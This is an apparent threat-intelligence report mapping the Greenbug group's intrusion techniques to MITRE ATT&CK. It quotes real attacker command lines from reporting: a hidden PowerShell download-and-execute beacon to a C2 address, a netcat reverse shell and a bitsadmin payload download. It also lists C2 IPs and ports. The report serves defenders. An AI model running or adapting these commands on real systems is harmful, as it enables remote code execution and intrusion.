# Greenbug — ATT&CK Technique Mapping

> Attribution: Iran-nexus — medium confidence.
> Enriched from public threat reporting (per-technique sources in intel/cti-pipeline.json).

Total techniques mapped: **35** across **11** tactics.

## Resource Development

| Technique | ID | Notes |
|---|---|---|
| Stage Capabilities: Upload Malware | [T1608.001](https://attack.mitre.org/techniques/T1608/001/) | Greenbug stages payloads and beacon stagers on its own C2 servers (e.g. 95.179.177.157 and 185.205.210.46 serving GRUNTStager/beacon URLs) for retrieval by PowerShell and BITS during intrusions. |

## Initial Access

| Technique | ID | Notes |
|---|---|---|
| Phishing: Spearphishing Attachment | [T1566.001](https://attack.mitre.org/techniques/T1566/001/) | Greenbug sends fake business-proposal spearphishing emails carrying a malicious attachment to deliver the ISMDOOR backdoor; in the South Asia telecom campaign the lure was a compiled-HTML-help (CHM) file named proposal_pakistan110.chm with an ADS-hidden payload (error.html). |

## Execution

| Technique | ID | Notes |
|---|---|---|
| User Execution: Malicious File | [T1204.002](https://attack.mitre.org/techniques/T1204/002/) | Initial code execution depends on the victim opening the delivered file — the CHM proposal (proposal_pakistan110.chm:error.html) was executed via a web browser and opened by archiver tools, showing a decoy PDF error message while the ADS payload ran. |
| System Binary Proxy Execution: Compiled HTML File | [T1218.001](https://attack.mitre.org/techniques/T1218/001/) | Greenbug abuses compiled HTML Help (.chm) files as an execution vector — the proposal_pakistan110.chm carried an embedded/ADS-hidden error.html payload executed via the HTML Help subsystem, and the group has favoured CHM delivery since 2016. |
| Command and Scripting Interpreter: PowerShell | [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | PowerShell is Greenbug's core execution engine: ISMDOOR uses PowerShell for C2; the group runs hidden downloadstring beacons (PowerShell.exe -nop -w hidden -c ... IEX $L.downloadstring('http://95.179.177.157:445/...')), deploys Powercat (dp.ps1), Mimikatz loaders (ccd61.ps1), Metasploit (msf.ps1) and web.config credential-decryption scripts. |
| Command and Scripting Interpreter: Windows Command Shell | [T1059.003](https://attack.mitre.org/techniques/T1059/003/) | Greenbug uses cmd.exe for discovery and a Netcat reverse shell — ncat.exe [IP] 8989 -e cmd.exe binds cmd to a listening port for interactive command execution. |
| Windows Management Instrumentation | [T1047](https://attack.mitre.org/techniques/T1047/) | Greenbug employs WMI to query for specific user accounts on target systems during reconnaissance. |

## Persistence

| Technique | ID | Notes |
|---|---|---|
| Create or Modify System Process: Windows Service | [T1543.003](https://attack.mitre.org/techniques/T1543/003/) | For persistence, Greenbug created a Windows service named 'VMwareUpdate' (November 2019) running a malicious payload disguised as legitimate VMware software. |
| Server Software Component: Web Shell | [T1505.003](https://attack.mitre.org/techniques/T1505/003/) | Greenbug deploys multiple webshells on compromised servers to maintain web-based remote access to victim telecom networks (several distinct webshell samples were recovered). |
| Valid Accounts | [T1078](https://attack.mitre.org/techniques/T1078/) | Greenbug reuses harvested credentials — SQL-server usernames/passwords decrypted from web.config were tested via PowerShell against database servers, and stolen administrator credentials underpin the group's assessed role of supplying access for the Shamoon 2 wiper's propagation. |

## Privilege Escalation

| Technique | ID | Notes |
|---|---|---|
| Abuse Elevation Control Mechanism: Bypass User Account Control | [T1548.002](https://attack.mitre.org/techniques/T1548/002/) | ISMDOOR runs PowerShell UAC-bypass routines to elevate — Invoke-bypassuac and Invoke-EventVwrBypass (the Event Viewer / eventvwr.exe hijack, delivered as ivb.ps1). |

## Defense Evasion

| Technique | ID | Notes |
|---|---|---|
| Hide Artifacts: NTFS File Attributes | [T1564.004](https://attack.mitre.org/techniques/T1564/004/) | Greenbug hides payloads in NTFS alternate data streams (ADS) to evade detection — the CHM lure carried its payload as the ADS proposal_pakistan110.chm:error.html, and ISMDOOR historically stored components in alternate data streams. |
| BITS Jobs | [T1197](https://attack.mitre.org/techniques/T1197/) | Greenbug abuses the Background Intelligent Transfer Service (bitsadmin /transfer) to download an executable from its C2 into the AppData directory, using a trusted OS service to blend the transfer with normal update traffic. |
| Deobfuscate/Decode Files or Information | [T1140](https://attack.mitre.org/techniques/T1140/) | Greenbug decrypts the encrypted connection strings harvested from web.config using the legitimate .NET aspnet_regiis.exe utility to reveal cleartext SQL usernames/passwords, and base64-decodes obfuscated C2 command arguments (e.g. to recover the vsiegru.com and kopilkaorukov.com domains). |
| Masquerading: Match Legitimate Resource Name or Location | [T1036.005](https://attack.mitre.org/techniques/T1036/005/) | Greenbug names its malware and services to impersonate trusted software — the persistence service 'VMwareUpdate', and payloads named adobe.exe, java.ee, printers.exe and comms.exe (a renamed Plink) to blend with legitimate binaries. |
| Obfuscated Files or Information: Encrypted/Encoded File | [T1027.013](https://attack.mitre.org/techniques/T1027/013/) | Greenbug delivers encoded/obfuscated stagers and payloads (e.g. the Covenant GRUNTStager.hta and base64/HTA-wrapped scripts) to hinder static detection, alongside the modified-base64 encoding of its DNS C2 messages. |

## Credential Access

| Technique | ID | Notes |
|---|---|---|
| OS Credential Dumping: LSASS Memory | [T1003.001](https://attack.mitre.org/techniques/T1003/001/) | Greenbug dumps credentials with Mimikatz — ISMDOOR carries a CreateMimi1Bat command that executes Mimikatz via PowerShell (ccd61.ps1), and in the telecom campaign Mimikatz was executed on March 4 from %USERPROFILE%\documents\x64. This credential harvesting is the assessed precursor role that fed the Shamoon 2 wiper's propagation. |
| Input Capture: Keylogging | [T1056.001](https://attack.mitre.org/techniques/T1056/001/) | ISMDOOR downloads and runs a keylogger — the ExecuteKL command deploys keylogging functionality (Winit.exe) to capture keystrokes and harvest credentials and sensitive input from infected hosts. |
| Unsecured Credentials: Credentials In Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) | Greenbug recursively enumerated web.config files on servers to extract encrypted SQL-server connection strings, harvesting stored database credentials from application configuration files. |

## Discovery

| Technique | ID | Notes |
|---|---|---|
| Account Discovery: Local Account | [T1087.001](https://attack.mitre.org/techniques/T1087/001/) | Greenbug enumerates local accounts on victim hosts with net user and uses WMI to search for specific user accounts on target systems. |
| System Information Discovery | [T1082](https://attack.mitre.org/techniques/T1082/) | ISMDOOR gathers system information via an SI command, and operators enumerate drives/storage with Get-PSDrive -PSProvider FileSystem. |
| System Network Configuration Discovery | [T1016](https://attack.mitre.org/techniques/T1016/) | Greenbug enumerates network configuration with arp -a to view the ARP table and identify neighbouring hosts. |
| System Network Connections Discovery | [T1049](https://attack.mitre.org/techniques/T1049/) | Greenbug runs netstat -a to enumerate active network connections and listening ports on compromised hosts. |
| System Owner/User Discovery | [T1033](https://attack.mitre.org/techniques/T1033/) | Greenbug runs whoami to confirm the current user context on compromised hosts. |
| File and Directory Discovery | [T1083](https://attack.mitre.org/techniques/T1083/) | Greenbug enumerates drives and the filesystem with Get-PSDrive -PSProvider FileSystem and recursively searches for files of interest (e.g. web.config) on servers. |

## Lateral Movement

| Technique | ID | Notes |
|---|---|---|
| Remote Services: Remote Desktop Protocol | [T1021.001](https://attack.mitre.org/techniques/T1021/001/) | Greenbug tunnels RDP/Terminal-Services sessions through its Plink and Bitvise SSH tunnels to interactively access and pivot between victim servers while masking the true source of the connections. |

## Collection

| Technique | ID | Notes |
|---|---|---|
| Screen Capture | [T1113](https://attack.mitre.org/techniques/T1113/) | ISMDOOR supports a PWS command that captures screenshots of the victim's desktop for exfiltration. |

## Command and Control

| Technique | ID | Notes |
|---|---|---|
| Ingress Tool Transfer | [T1105](https://attack.mitre.org/techniques/T1105/) | Greenbug pulls follow-on tooling to victims via PowerShell net.webclient downloadstring calls to its C2 (e.g. http://95.179.177.157:8081/, http://185.205.210.46:1003/) and via BITS: bitsadmin /transfer a8f4 http://95.179.177.157:8081/asdfd CSIDL_APPDATA\a8f4.exe. |
| Application Layer Protocol: DNS | [T1071.004](https://attack.mitre.org/techniques/T1071/004/) | ISMDOOR moved from HTTP to a DNS-based covert channel, encoding a bidirectional C2 protocol into DNS queries with 32-character hex session IDs and structured labels (e.g. n.n.c.<session_id>.c2.com for session setup, <encoded_msg>.<msg_num>.dr.<session_id>.c2.com for transmission, www.<msg_num>.s.<session_id>.c2.com for retrieval) and static AAAA/IPv6 responses carrying data. |
| Application Layer Protocol: Web Protocols | [T1071.001](https://attack.mitre.org/techniques/T1071/001/) | Earlier ISMDOOR variants and the Covenant/Cobalt Strike/Metasploit stagers used HTTP(S) for C2 and payload retrieval, including PowerShell beacons to http://95.179.177.157 and http://185.205.210.46 on non-standard ports. |
| Data Encoding: Standard Encoding | [T1132.001](https://attack.mitre.org/techniques/T1132/001/) | ISMDOOR's DNS covert channel uses a modified base64 encoding (substituting = -> !, / -> &, + -> @) so encoded C2 messages remain valid DNS labels; the group also base64-encodes C2 arguments (e.g. domains vsiegru.com and kopilkaorukov.com decoded from base64 command arguments). |
| Non-Standard Port | [T1571](https://attack.mitre.org/techniques/T1571/) | Greenbug C2 uses non-standard ports for HTTP beacons and staging — e.g. 95.179.177.157 on ports 445 and 8081, and 185.205.210.46 on ports 1003 and 1131. |
| Encrypted Channel: Asymmetric Cryptography | [T1573.002](https://attack.mitre.org/techniques/T1573/002/) | Greenbug's Cobalt Strike and Covenant post-exploitation frameworks tunnel C2 over TLS-encrypted channels to conceal beacon content. |
| Proxy | [T1090](https://attack.mitre.org/techniques/T1090/) | Greenbug relays connections through HTTP proxies to reach victim machines — Plink (renamed comms.exe) was invoked with -proxytype http_basic -proxyip [IP] and the Bitvise client used with proxy credentials to route tunneled RDP/Terminal-Services traffic. |
| Protocol Tunneling | [T1572](https://attack.mitre.org/techniques/T1572/) | Greenbug maintains persistent low-profile access via SSH tunnels — Plink (comms.exe) builds reverse/RDP tunnels (e.g. -C -R [host]:4015:[host]:1540) through HTTP proxies, and the Bitvise SSH command-line client is used as an alternative tunneling tool to reach RDP/Terminal Services. |
